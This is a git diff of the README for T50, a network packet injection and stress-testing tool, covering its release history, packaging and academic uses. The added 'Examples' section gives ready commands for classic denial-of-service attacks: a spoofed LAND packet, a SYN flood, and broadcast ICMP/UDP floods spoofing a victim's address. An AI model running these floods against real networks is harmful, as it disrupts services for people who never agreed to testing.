@@ -25,7 +25,7 @@ Things have changed, and the **T50** became a good unique resource capable to pe
 * [UDP (User Datagram Protocol)](https://en.wikipedia.org/wiki/User_Datagram_Protocol)
 
 ## History
-**T50** was first released at [Hackers to Hackers Conference Seventh Edition](https://www.h2hc.com.br/), November 2010, and, less than five months later, was updated and released at Web Security Forum, April 2011. The significant 2011 update introduced ten protocols and redesigned the packet build process, which are still the same since then.
+**T50** was first released at [Hackers to Hackers Conference Seventh Edition](https://www.h2hc.com.br/), [November 2010](https://github.com/nbrito/source/tree/master/c/t50#november-2010), and, less than five months later, was updated and released at Web Security Forum, [April 2011](https://github.com/nbrito/source/tree/master/c/t50#april-2011). The significant 2011 update introduced ten protocols and redesigned the packet build process, which are still the same since then.
 
 Through the years, **T50** has been widely used by companies validating their infrastructures (running **T50** by themselves or buying/contracting a third-party tool/consultancy that incorporates the **T50**), and, due to its [power and unique](https://github.com/nbrito/source/tree/master/c/t50#a-powerful-and-unique-tool) approach, **T50** has been incroporated by:
 * [ArchAssault](https://archassault.org/packages/archassault/x86_64/t50/)
@@ -36,15 +36,20 @@ Through the years, **T50** has been widely used by companies validating their in
 * [Ubuntu](https://packages.ubuntu.com/artful/t50)
 
 Also, proving **T50** [power and unique](https://github.com/nbrito/source/tree/master/c/t50#a-powerful-and-unique-tool) approach, it has been used as a tool to support academic papers and studies:
-1. ["ANOMALIAS E SEGURANÇA EM REDES COMPUTACIONAIS: Uma abordagem prática com ataque DOS"](http://www.fatecbauru.edu.br/ojs/index.php/CET/article/download/53/49)
-2. ["SISTEMA DE DETECÇÃO DE INTRUSÃO E BLOQUEIO DE ATAQUES UTILIZANDO IDS-SNORT"](http://www.fateclins.edu.br/site/trabalhoGraduacao/7FQZs5t7Bb5kV8ssc2IR1GWUXM6Uw46ynNFVy8dVNTY20vB.pdf)
-3. ["AVALIAÇÃO PREVENTIVA DE VULNERABILIDADE NOS SISTEMAS COMPUTACIONAIS DA UNIVERSIDADE FEDERAL DO CEARÁ"](http://www.repositoriobib.ufc.br/000013/0000137a.pdf)
-4. ["SISTEMAS IDS E IPS – ESTUDO E APLICAÇÃO DE FERRAMENTA OPEN SOURCE EM AMBIENTE LINUX"](http://painel.passofundo.ifsul.edu.br/uploads/arq/20160331191141344853464.pdf)
-5. ["ESTUDO DE CASO DE ATAQUES DE NEGAÇÃO DE SERVIÇO"](http://www.fatecbauru.edu.br/ojs/index.php/CET/article/download/197/164)
-6. ["TESTES DE SEGURANÇA EM SDN'S, UTILIZANDO HONEYPOT"](http://www.monografias.ufop.br/bitstream/35400000/253/1/MONOGRAFIA_TestesSegurançaSDN%27s.pdf)
-7. ["PROTEGENDO SERVIDORES DE REDE COM OSSEC-HIDS"](http://www.fateclins.edu.br/site/trabalhoGraduacao/fH8dnMpZlbbf6qdmmozdM7CH2jvO2KB4hIn8zC4sPjcsL9W.pdf)
-8. ["SISTEMA DE DETECÇÃO DE INTRUSÃO EM REDES DE COMPUTADORES COM TÉCNICAS DE INTELIGÊNCIA COMPUTACIONAL"](http://repositorio.ufla.br/bitstream/1/12161/1/DISSERTAÇÃO_Sistema%20de%20detecção%20de%20intrusão%20em%20redes%20de%20computadores%20com%20técnicas%20de%20inteligência%20computacional.pdf)
-9. ["UMA PROPOSTA DE ARQUITETURA DE SEGURANÇA PARA A DETECÇÃO E REAÇÃO A AMEAÇAS EM REDES SDN"](http://seer.upf.br/index.php/rbca/article/viewFile/6595/4190)
+* ["ANOMALIAS E SEGURANÇA EM REDES COMPUTACIONAIS: Uma abordagem prática com ataque DOS"](http://www.fatecbauru.edu.br/ojs/index.php/CET/article/download/53/49)
+* ["SISTEMA DE DETECÇÃO DE INTRUSÃO E BLOQUEIO DE ATAQUES UTILIZANDO IDS-SNORT"](http://www.fateclins.edu.br/site/trabalhoGraduacao/7FQZs5t7Bb5kV8ssc2IR1GWUXM6Uw46ynNFVy8dVNTY20vB.pdf)
+* ["AVALIAÇÃO PREVENTIVA DE VULNERABILIDADE NOS SISTEMAS COMPUTACIONAIS DA UNIVERSIDADE FEDERAL DO CEARÁ"](http://www.repositoriobib.ufc.br/000013/0000137a.pdf)
+* ["SISTEMAS IDS E IPS – ESTUDO E APLICAÇÃO DE FERRAMENTA OPEN SOURCE EM AMBIENTE LINUX"](http://painel.passofundo.ifsul.edu.br/uploads/arq/20160331191141344853464.pdf)
+* ["ESTUDO DE CASO DE ATAQUES DE NEGAÇÃO DE SERVIÇO"](http://www.fatecbauru.edu.br/ojs/index.php/CET/article/download/197/164)
+* ["TESTES DE SEGURANÇA EM SDN'S, UTILIZANDO HONEYPOT"](http://www.monografias.ufop.br/bitstream/35400000/253/1/MONOGRAFIA_TestesSegurançaSDN%27s.pdf)
+* ["PROTEGENDO SERVIDORES DE REDE COM OSSEC-HIDS"](http://www.fateclins.edu.br/site/trabalhoGraduacao/fH8dnMpZlbbf6qdmmozdM7CH2jvO2KB4hIn8zC4sPjcsL9W.pdf)
+* ["SISTEMA DE DETECÇÃO DE INTRUSÃO EM REDES DE COMPUTADORES COM TÉCNICAS DE INTELIGÊNCIA COMPUTACIONAL"](http://repositorio.ufla.br/bitstream/1/12161/1/DISSERTAÇÃO_Sistema%20de%20detecção%20de%20intrusão%20em%20redes%20de%20computadores%20com%20técnicas%20de%20inteligência%20computacional.pdf)
+* ["UMA PROPOSTA DE ARQUITETURA DE SEGURANÇA PARA A DETECÇÃO E REAÇÃO A AMEAÇAS EM REDES SDN"](http://seer.upf.br/index.php/rbca/article/viewFile/6595/4190)
+
+Last, but not least, **T50** has been mentioned by some security vendors and consulting:
+* [Fortinet](http://www.isacapr.com/uploads/3/9/5/4/39543893/303_v2.pdf)
+* [Radware](https://blog.radware.com/security/2016/06/2016-republican-national-convention-rnc-democratic-national-convention-dnc-will-be-cyber-attacked/)
+* [Network Warrior Weekend Camp](https://nwwc.dk)
 
 ### November 2010
 * [Talk](https://github.com/nbrito/talks/tree/master/2010/h2hc)
@@ -103,6 +108,16 @@ This new version ([5.3](https://github.com/nbrito/source/tree/master/c/t50/5.3) 
 * More than 1,000,000 pps of [SYN](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#CONNECTION-ESTABLISHMENT)  (+50% of the network uplink) in a [1000BASE-T](https://en.wikipedia.org/wiki/Gigabit_Ethernet#1000BASE-T) network ([Gigabit Ethernet](https://en.wikipedia.org/wiki/Gigabit_Ethernet)).
 
 The main differentiator of the **T50** is that it is able to send all protocols, sequentially, using one single [RAW(7) SOCKET](https://en.wikipedia.org/wiki/Raw_socket), besides it can be capable to modify network routes.
+
+### Examples
+1.  [CVE-1999-0016](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0016):
+* ```$ sudo ./t50 [target-address]  --dport [target-port] --saddr [target-address] --sport [target-port] --protocol TCP --syn --sequence 3868 --window 2048 --threshold 1```
+2. [CVE-1999-0116](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0116)
+* ```$ sudo ./t50 [target-address] --dport [target-port] --protocol TCP -S --flood```
+3. [CVE-1999-0513](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0513)
+* ```$ sudo ./t50 [broadcast-address] --saddr [target-address] --protocol ICMP --icmp-type 8 --icmp-code 0 --flood```
+4. [CVE-1999-0514](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0514)
+* ```$ sudo ./t50 [broadcast-address] --saddr [target-address] --protocol UDP --icmp-type 8 --icmp-code 0 --flood```
 
 For current release of **T50**, please, refer to this [link](https://github.com/fredericopissarra/t50).
 
